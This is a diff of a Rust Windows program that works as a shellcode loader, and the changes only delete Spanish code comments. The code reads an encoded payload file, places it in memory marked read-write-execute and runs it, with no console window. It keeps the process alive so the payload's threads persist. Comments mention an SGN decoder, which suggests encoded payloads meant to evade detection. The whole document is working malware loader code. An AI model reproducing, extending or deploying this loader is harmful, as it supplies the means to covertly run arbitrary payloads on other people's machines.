@@ -15,7 +15,6 @@ use windows_sys::Win32::System::Memory::{
 const SHELLCODE_NAME: &str = "shellcode.bin";
 const LOG_NAME: &str = "loader.log";
 
-/// Escribe un log junto al ejecutable (con windows subsystem no hay consola).
 fn log(msg: &str) {
     if let Ok(exe) = env::current_exe() {
         if let Some(dir) = exe.parent() {
@@ -43,7 +42,6 @@ fn shellcode_path() -> PathBuf {
     PathBuf::from(SHELLCODE_NAME)
 }
 
-/// Carga un .bin con shellcode en memoria y lo ejecuta.
 pub fn exec_mem(file_path: &Path) -> Result<(), String> {
     let code = fs::read(file_path)
         .map_err(|e| format!("Error al abrir '{}': {}", file_path.display(), e))?;
@@ -68,7 +66,6 @@ pub fn exec_mem(file_path: &Path) -> Result<(), String> {
 
         ptr::copy_nonoverlapping(code.as_ptr(), addr as *mut u8, code.len());
 
-        // READWRITE (no READ): el decoder de SGN escribe sobre el propio buffer.
         let mut old_protect: u32 = 0;
         if VirtualProtect(addr, code.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) == 0 {
             VirtualFree(addr, 0, MEM_RELEASE);
@@ -81,8 +78,6 @@ pub fn exec_mem(file_path: &Path) -> Result<(), String> {
         let func: extern "system" fn() = std::mem::transmute(addr);
         func();
 
-        // OJO: no liberamos. El shellcode puede haber spawneado un hilo
-        // y seguir ejecutándose después de que func() retorne.
     }
 
     Ok(())
@@ -93,7 +88,6 @@ fn main() {
 
     match exec_mem(&path) {
         Ok(()) => {
-            // func() retornó -> el shellcode vive en otro hilo. Mantenemos el proceso.
             log("[OK] shellcode lanzado; proceso mantenido vivo.\n");
             loop {
                 std::thread::park();
@@ -101,8 +95,6 @@ fn main() {
         }
         Err(e) => {
             log(&format!("[ERROR] {}\n", e));
-            // Sin consola: si querés que quede vivo igual, descomentá:
-            // loop { std::thread::park(); }
         }
     }
 }
